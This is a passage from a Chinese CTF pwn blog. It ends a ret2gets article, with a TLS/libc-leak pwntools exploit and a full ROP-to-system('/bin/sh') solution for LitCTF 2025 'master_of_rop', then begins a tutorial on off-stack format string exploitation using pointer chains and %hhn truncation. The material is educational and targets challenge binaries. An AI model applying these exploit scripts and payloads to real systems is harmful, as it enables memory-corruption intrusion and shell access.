带来的截断</p><p>但是没有关系，我们依旧有办法解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># glibc-2.37 to glibc-2.39 更高版本未进行尝试</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = context.binary = ELF(<span class="string">&#x27;demo&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc&quot;</span>)</span><br><span class="line">p = e.process()</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span> * <span class="number">0x20</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment"># saved rbp</span></span><br><span class="line">payload += p64(e.plt.gets)</span><br><span class="line">payload += p64(e.plt.gets)</span><br><span class="line">payload += p64(e.plt.puts)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;ROP me if you can!\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendline(p32(<span class="number">0</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">4</span> + <span class="string">b&quot;B&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;CCCC&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">tls = u64(p.recv(<span class="number">6</span>) + <span class="string">b&quot;\x00\x00&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&quot;tls: <span class="subst">&#123;<span class="built_in">hex</span>(tls)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc.address = tls + <span class="number">0x28c0</span></span><br><span class="line">log.info(<span class="string">f&quot;libc: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>我们来对着上面这个exp调试一下<br>溢出之后的第一次gets，我们输入了 <code>\x00\x00\x00\x00AAAABBBBBBBB</code> 而第一个 <code>A-1 </code> 变成了 <code>0x40</code><br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/10.png"></p><p>溢出之后的第二次gets，我们输入了 <code>CCCC</code> 并且将原本的 <code>0x40</code> 覆盖成了字符串终止符 <code>\x00</code> (注意这还没有结束)<br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/11.png"></p><p>最后执行我们执行 <code>cnt-1</code><br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/12.png"></p><p>我们发现原本的 <code>0x41414100</code> 变成了 <code>0x414140ff</code> 我们依旧是完美的绕过了 <code>\x00</code> 以及各种检测</p><h3 id="额外的情况发生了怎么办呢"><a href="#额外的情况发生了怎么办呢" class="headerlink" title="额外的情况发生了怎么办呢?"></a><strong>额外的情况发生了怎么办呢?</strong></h3><p>下面我们探讨一个新问题:<br>虽然我们拥有gets<br>但是最后程序结束的时候 <code>rdi != _IO_stdfile_0_lock</code> 怎么办<br>比如下面这个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;ROP me if you can!&quot;</span>);</span><br><span class="line">gets(buf);</span><br><span class="line">func(); <span class="comment">// 未知函数，执行之后不知道 rdi 会是什么</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么会有以下几种情况:</p><ol><li><p><code>rdi</code> 虽然不是 <code>_IO_stdfile_0_lock</code> 但是依旧可写<br>这种情况很简单，溢出之后调用一次gets，<code>rdi</code> 就变成 <code>_IO_stdfile_0_lock</code> 然后思路后续还是一样的思路，2.30-2.36调用gets然后调用puts泄露，2.37+则调用两次gets再调用puts</p></li><li><p><code>rdi</code> 不可写了，但是可读<br>没办法调用gets了，但是我们可以考虑直接使用puts是否会有效果</p></li><li><p><code>rdi == NULL</code><br>大多数IO函数已经没办法使用了，但是 <code>printf</code> 依旧可用<br><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/printf.c#L27">printf</a> 定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__printf (<span class="type">const</span> <span class="type">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list arg;</span><br><span class="line">  <span class="type">int</span> done;</span><br><span class="line"></span><br><span class="line">  va_start (arg, format);</span><br><span class="line">  done = __vfprintf_internal (<span class="built_in">stdout</span>, format, arg, <span class="number">0</span>);</span><br><span class="line">  va_end (arg);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在源码中我们可以看到它调用了 <code>__vfprintf_internal</code> 这个函数，并且第一个参数为 <code>stdout</code> , 这意味着 <code>rdi</code> 寄存器将指向 <code>stdout</code></p></li></ol><p>然后在 <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfprintf-internal.c#L1179">__vfprintf_internal</a> 中，我们看到它在早期调用 <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfprintf-internal.c#L49">ARGCHECK</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">vfprintf</span> <span class="params">(FILE *s, <span class="type">const</span> CHAR_T *format, va_list ap, <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check of arguments.  */</span></span><br><span class="line">  ARGCHECK (s, format);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ARGCHECK(S, Format) \</span></span><br><span class="line"><span class="meta">  do      \</span></span><br><span class="line"><span class="meta">    &#123;      \</span></span><br><span class="line"><span class="meta">      <span class="comment">/* Check file argument for consistence.  */</span>      \</span></span><br><span class="line"><span class="meta">      CHECK_FILE (S, -1);      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (S-&gt;_flags &amp; _IO_NO_WRITES)      \</span></span><br><span class="line"><span class="meta">&#123;      \</span></span><br><span class="line"><span class="meta">  S-&gt;_flags |= _IO_ERR_SEEN;      \</span></span><br><span class="line"><span class="meta">  __set_errno (EBADF);      \</span></span><br><span class="line"><span class="meta">  return -1;      \</span></span><br><span class="line"><span class="meta">&#125;      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (Format == NULL)      \</span></span><br><span class="line"><span class="meta">&#123;      \</span></span><br><span class="line"><span class="meta">  __set_errno (EINVAL);      \</span></span><br><span class="line"><span class="meta">  return -1;      \</span></span><br><span class="line"><span class="meta">&#125;      \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>通过上面代码我们不难得到结论，如果 <code>format == NULL</code> 那么 <code>printf函数</code> 会被强制返回，也就是说并不会导致错误，而且由于<code>__vfprintf_internal</code> 的第一个参数为 <code>stdout</code> 也就是说强制返回的时候 <code>rdi</code> 将指向 <code>stdout</code> 下面我们来写一段代码验证</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -Wno-nonnull -Wno-format-overflow -o printf_test printf_test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然，我们的结论是成立的<br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/13.png"><br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/14.png"></p><p>那么也就是说这里我们可以再次调用gets，然后就可以控制 <code>_IO_2_1_stdout_</code> 熟悉IO的师傅应该可以知道，控制了这个之后如果条件允许我们是可以打 <code>FSOP</code> 的，当然这里不详细展开</p><p>当然还有别的情况，这里不在过多介绍，感兴趣的师傅可以看看我参考的文章讲解的更加详细</p><p>下面推荐一个题目是 <code>2025 LitCTF</code> 的 <code>master of rop</code><br><a href="https://www.nssctf.cn/problem/6782">[LitCTF 2025]master_of_rop | NSSCTF</a></p><p>懒得分析了，直接贴exp<br>但是很怪，本地打不通，远程却可以通</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span> </span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">challenge = <span class="string">&quot;./pwn2&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;node4.anna.nssctf.cn:28093&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">1</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 自定义cmd</span></span><br><span class="line">cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    set follow-fork-mode parent\n</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = []</span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line"></span><br><span class="line">gets_plt = elf.plt[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">leak(<span class="string">&quot;gets_plt&quot;</span>)</span><br><span class="line">leak(<span class="string">&quot;puts_plt&quot;</span>)</span><br><span class="line">main_addr = <span class="number">0x04011AD</span> </span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span> * <span class="number">0x28</span></span><br><span class="line">payload += p64(gets_plt)</span><br><span class="line">payload += p64(gets_plt)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Welcome to LitCTF2025!\n&quot;</span>, payload)</span><br><span class="line">io.sendline(p32(<span class="number">0</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">4</span> + <span class="string">b&quot;B&quot;</span>*<span class="number">8</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;CCCC&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">tls = u64(io.recv(<span class="number">6</span>) + <span class="string">b&quot;\x00\x00&quot;</span>)</span><br><span class="line">leak(<span class="string">&quot;tls&quot;</span>)</span><br><span class="line">libc_base = tls + <span class="number">0x28c0</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]    </span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000010f75b</span><span class="comment">#: pop rdi; ret;</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002882f</span><span class="comment">#: ret;</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span> * <span class="number">0x28</span> </span><br><span class="line">payload += p64(pop_rdi_ret) </span><br><span class="line">payload += p64(bin_sh_addr) </span><br><span class="line">payload += p64(ret) </span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg(1, bps, cmd)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Welcome to LitCTF2025!\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/15.png"></p><p>参考:<br><a href="https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets#sidenote-on-finding-locking-functions">ret2gets | pwn-notes</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Writeup </category>
          
          <category> ret2系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> ret2X </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>非栈上格式化字符串的利用方法</title>
      <link href="/2025/06/13/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2025/06/13/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>本文以<code>第六届强网拟态线下赛</code>的格式化字符串Pwn题为例，分享非栈上格式化字符串的利用方法。<br>主要涵盖两个关键技术点： </p><ol><li><strong>多级指针链利用</strong>：当格式化字符串不在栈上时，通过修改栈上现有的多级指针链（二重&#x2F;三重指针）来间接控制目标内存 </li><li><strong>高位截断技术</strong>：当前期输出字符数已超过后期需求值时，利用<code>0x10000</code>溢出特性实现单字节精确写入</li></ol><p>同时探讨<code>为何不能在同一条指针链上使用 $ 符号进行连续修改</code>的问题，并提出个人结论（如有错误希望师傅们指出）。</p><p>通过网盘分享的文件：第六届强网拟态fmt.rar<br>链接: <a href="https://pan.baidu.com/s/19-fAYm0DuEhkSO7SzlJLAg?pwd=xidp">https://pan.baidu.com/s/19-fAYm0DuEhkSO7SzlJLAg?pwd=xidp</a> 提取码: xidp</p><h3 id="第六届强网拟态线下赛的格式化字符串"><a href="#第六届强网拟态线下赛的格式化字符串" class="headerlink" title="第六届强网拟态线下赛的格式化字符串"></a><strong>第六届强网拟态线下赛的格式化字符串</strong></h3><p><img src="/../picture/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/1.png"></p><p>程序逻辑很简单，白给一个stack的地址，然后给一个非栈上格式化字符串的机会，最后没办法控制main函数的返回地址，因为是直接使用exit退出<br><img src="/../picture/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2.png"></p><p>显而易见的我们遇到了两个问题:</p><ol><li>首先我们的 <code>buf</code> 不在栈上，没办法随意在栈中写入我们想要的地址然后去修改</li><li>其次我们只有一次机会</li></ol><p>首先来看看如果是 <code>非栈上的格式化字符串</code> 我们如何指定目标去修改<br>我们使用gdb调试，将程序运行到 <code>call printf</code> 指令所在的地址，然后我们查看栈的情况看看什么可以利用的<br><img src="/../picture/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/3.png"><br><img src="/../picture/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/4.png"><br>查看此时栈中的内容，我们发现栈中有多级指针链(也就是图中红色方框框出来的部分)<br>那么有一个大胆的想法就产生了，我们是否可以通过修改这些多级指针链的内容从而控制我们想要的地址呢?</p><p>比如下图所示:<br>下图中程序运行至 <code>call printf</code> 然后查看栈中信息 </p><p>我们查看栈地址可知其中的 <code>0x7ffde9b11bd8</code> 在程序中对于 <code>printf函数</code> 的偏移为 <code>11</code><br>而 <code>0x7ffde9b11cb8</code> 的偏移则为 <code>39</code> 其中存储 <code>0x7ffde9b12317</code> 这个栈地址<br>通过调试我们得知 <code>printf函数</code> 的返回地址存储在 <code>0x7ffde9b11ba8</code></p><p>那么我们的想法很简单<br>利用 <code>%n</code> 去修改 <code>0x7ffde9b11cb8</code> 中存储的地址，把 <code>0x7ffde9b12317</code> 改为 <code>0x7ffde9b11ba8</code> 修改两个字节即可<br>然后就可以利用 <code>%n</code> 去修改 <code>0x7ffde9b11ba8</code> 中存储的地址了,调试可知只需要修改一字节即可<br>也就是说这样我们就可以控制 <code>printf函数</code> 的返回地址了</p><p>我们构造的payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输出90个字节</span></span><br><span class="line">payload = <span class="string">b&#x27;%p&#x27;</span> * <span class="number">9</span> </span><br><span class="line"><span class="comment"># 修改第11个参数地址对应的值为 printf_ret_addr (这里是只需要修改末尾2个字节就行)</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(printf_ret_addr - <span class="number">90</span>).encode()+<span class="string">b&#x27;c%hn&#x27;</span> </span><br><span class="line"><span class="comment"># 可以将目标低字节修改为 0x23</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x100023</span> - (printf_ret_addr)).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br></pre></td></tr></table></figure><p>这里使用了高位截断的技巧，因为前面我们已经修改了两个字节了也就是说我们输出的字节数已经大于0x23了，那么我们就可以让程序输出 <code>0x100023</code> 个字节，然后我们使用 <code>hhn</code> 也就是修改目标一字节，那么就会提取出 <code>0x100023</code> 末尾的 <code>0x23</code> 作为写入的数据</p><p><img src="/../picture/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/5.png"><br><img src="/../picture/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/6.png"><br><img src="/../picture/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/7.png"><br><img src="/../picture/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/8.png"></p><p>这里需要注意我们不能对同一条链子(比如图中的 <code>0x7ffde9b11bd8 -&gt; 0x7ffde9b11cb8 -&gt; 0x7ffde9b12317</code> )连续使用两次 <code>$</code> 符号<br>如果我们第一次使用了 <code>%11$n</code> 那么第二次的 <code>%39$n</code> 就无法生效了</p><p>我们使用下面这条payload对比上面的payload来举个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(printf_ret_addr).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100023</span> - (printf_ret_addr)).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br></pre></td></tr></table></figure><p>我们先来看看执行这条payload发生了什么(为了方便理解，这里我关掉了系统的aslr)</p><p>这是没有执行之前，pritnf 的返回地址是 <code>0x55555555523c</code><br>我们的链子是 <code>0x7fffffffdf48 —▸ 0x7fffffffe028 —▸ 0x7fffffffe33a ◂— 0x4853006e77702f2e /* &#39;./pwn&#39; */</code><br><img src="/../picture/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/9.png"></p><p>执行之后，我们发现尽管我们已经修改了链子，但是依旧没有成功修改printf的返回地址<br>这就要问了，我们的第二个修改了什么？</p><p><img src="/../picture/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/10.png"></p><p>既然我们没有成功修改返回地址，那第二个 <code>n</code> 修改了什么?<br>我们再来看我们原本的链子下的 <code>0x7fffffffe33a</code> 数据从 <code>./pwn</code> 变成了 <code>#/pwn</code><br><img src="/../picture/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/11.png"></p><p>也就是说我们虽然将 <code>0x7fffffffe33a</code> 修改为 <code>0x7fffffffdf18</code><br>但是我们的 <code>%39$n</code> 修改的依旧是 <code>0x7fffffffe33a</code> 这个地址存储的值，而不是 <code>0x7fffffffdf18</code> 地址保存的值，这是为什么?</p><p>这是因为 <code>$</code> 符号的实现的时候并不是直接去 <code>栈</code> 中找，而是分析完完整的format参数后采用一种预处理的手段，找到最大的 <code>%x$n</code> 然后从栈上将响应的信息提取到 <code>args_value</code> 当需要修改的时候就去 <code>args_value</code> 里面找到对应的地址<br>也就是说虽然我们第一次改成功了，但是被修改的是栈中的数据，而 <code>args_value</code> 依旧是原来的值，所以我们修改的值依旧是原来的值<br>如果还想要知道更加具体的过程我们就需要进入到pritnf源码里面去分析了，这里不再过多讲解，有兴趣的师傅可以看一下<code>WJH师傅</code>写的博客<a href="https://blog.wjhwjhn.com/posts/af55bf3/#%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8">格式化字符串漏洞利用 - WJH’s Blog</a></p><p>下面放出我调试的截图(可能不太准确，做一个参考吧)</p><p><code>call printf</code> 时候的栈空间<br><img src="/../picture/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/12.png"></p><p>打入不同payload之后在栈的某一地址中存储了我们的使用 <code>$</code> 符号所用到的指针(也有师傅说这些指针是存放在堆上的? 但是我调试尽管发现有使用malloc函数但是并没有在堆中找到我们调用的指针, 如果有错也欢迎师傅们指出，同时也希望有更加严谨的结论的师傅分享自己的结论和文章)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(printf_ret_addr).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100023</span> - (printf_ret_addr)).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/../picture/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/13.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(printf_ret_addr).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100023</span> - (printf_ret_addr)).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x10005b</span> - <span class="number">0x100023</span>).encode()+<span class="string">b&#x27;c%27$hhn&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/../picture/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/14.png"></p><p>然后使用格式化字符串修改 <code>0x7fffffffdf48 —▸ 0x7fffffffe028 —▸ printf的返回地址</code> 指向pritnf函数返回地址之后，我们每次都可以使用 <code>payload = b&#39;%&#39; + str(0x23).encode() + b&#39;c%39$hhn&#39;</code> 这条payload去修改printf的返回地址，达到多次使用格式化字符串漏洞</p><p>接下来就是在 <code>printf函数的返回地址</code> 下面的一个栈空间一步一步填入 <code>one_gadget</code> 然后最后将 <code>pritnf函数的返回地址</code> 修改为 <code>ret指令</code> 地址 ，从而调用 <code>one_gadget</code></p><p>具体exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 